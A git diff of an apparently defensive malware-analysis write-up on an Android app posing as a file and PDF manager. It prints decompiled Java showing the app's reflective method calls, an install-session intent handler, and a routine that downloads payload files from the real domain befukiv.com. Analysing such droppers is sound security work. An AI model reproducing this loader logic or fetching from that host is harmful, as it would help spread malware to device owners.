@@ -66,42 +66,88 @@ jadx -d out classes.dex
 
 ## Walkthrough
 
-TODO: Finding initial point of application and trace it back to download of malware
+The main application file are present ant **com.tragisoap.fileandpdfmanager**, so it makes sense to start from here our search. Most of the files appear harmless, but when coming across the class _PartPreviewActivity_, we can notice some strange pattern in the code.
+
+```java
+public final void onCreate(Bundle bundle) {
+    String str;
+    String str2 = "tura dar";
+    super.onCreate(bundle);
+    s().t(1);
+    getWindow().setStatusBarColor(0);
+    setContentView(2131492981);
+    TextView textView = (TextView) findViewById(2131296755);
+    try {                                                               // First try
+        m.f3835d.invoke(null, this);                
+    } catch (IllegalAccessException | InvocationTargetException e) {
+        e.printStackTrace();
+    }
+    Button button = (Button) findViewById(2131296492);
+    try {                                                               // Second try
+        str = (String) m.f3833b.invoke(null, new Object[0]);
+    } catch (IllegalAccessException | InvocationTargetException e7) {
+        e7.printStackTrace();
+        str = "tura dar";
+    }
+    textView.setText(str);
+    try {                                                               // Third try
+        str2 = (String) m.f3834c.invoke(null, new Object[0]);
+    } catch (IllegalAccessException | InvocationTargetException e8) {
+        e8.printStackTrace();
+    }
+    button.setText(str2);
+    button.setOnClickListener(new q(4, this));
+}
+```
+
+It is not that common for an application to successively try and expect the same exception in such a short time, and this may suggest that the developer expects some kind of resistance from the system. The most concerning section however is present on the _onNewIntent_ method of the same class, were we find that the application request information of the system regarding it's **package installation permissions** as a condition for an action.
+
+```java
+public final void onNewIntent(Intent intent) {
+    super.onNewIntent(intent);
+    Bundle extras = intent.getExtras();
+    if ("com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED".equals(intent.getAction()) && extras.getInt("android.content.pm.extra.STATUS") == -1) {
+        startActivity((Intent) extras.get("android.intent.extra.INTENT"));
+    }
+}
+```
+
+Looking back at the successive tty, using `JADX` we can find where the methods that are trying to be triggered are declared. We renamed the class that defines them to _Malicious_.
 
 ### Exploring Application External Accesses
 
-Given that the application contains malware, it's probable that at some point it downloads additional files from external services. We decided to search the codebase for URLs in the 'https://' format. And we found the following Java function.
+In the _Malicious_ class, we can see that it downloads additional files from external services.
 
 ```java
-    public static void a() {
-        String str;
-        y4.p pVar = new y4.p();
-        r.a aVar = new r.a();
-        aVar.c("https://befukiv.com/muchaspuchas");
-        y4.r a7 = aVar.a();
-        r.a aVar2 = new r.a();
-        aVar2.c("https://befukiv.com/cortina");
-        y4.r a8 = aVar2.a();
-        try {
-            y4.t tVar = new y4.d(pVar, a7).a().f6804g;
-            byte[] b2 = tVar.b();
-            y4.o e7 = tVar.e();
-            Charset charset = z4.h.f6957c;
-            if (e7 != null && (str = e7.f6764b) != null) {
-                charset = Charset.forName(str);
-            }
-            f3837g.set(new String(b2, charset.name()).split("\\|"));
-            byte[] b7 = new y4.d(pVar, a8).a().f6804g.b();
-            if (f3839i.get()) {
-                return;
-            }
-            f3838h.getClass();
-            g6.i.h(b7);
-            f3839i.set(true);
-        } catch (Throwable th) {
-            th.printStackTrace();
+public static void a() {
+    String str;
+    Session session = new Session();
+    HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
+    getrequest.request("https://befukiv.com/muchaspuchas");
+    HttpHandler call = getrequest.call();
+    HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
+    getrequest2.request("https://befukiv.com/cortina");
+    HttpHandler call2 = getrequest2.call();
+    try {
+        ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
+        byte[] parse = parseHttpResponseBody.parse();
+        TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
+        Charset charset = z4.h.utf8Charset;
+        if (twoStrings != null && (str = twoStrings.secondStr) != null) {
+            charset = Charset.forName(str);
         }
+        muchasStrings.set(new String(parse, charset.name()).split("\\|"));
+        byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
+        if (fetchAndProcessCompleted.get()) {
+            return;
+        }
+        fw.getClass();
+        WriterFile.mapMuchasPuchasToMethods(parse2);
+        fetchAndProcessCompleted.set(true);
+    } catch (Throwable th) {
+        th.printStackTrace();
     }
+}
 ```
 
 Although it's obfuscated, we can see that it's accessing files from the domain **befukiv.com**. A DNS search reveals that this domain has two name servers pointing to domains in Russia.
@@ -174,7 +220,7 @@ This shows that authors wanted to obfuscate application method calls with reflec
 TODO
 1. muchaspuchas maybe a CSV type file
 2. Based on 1., we look for split functions.
-
+3. Explore the `mapMuchasPuchasToMethods` method
 
 
 Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.
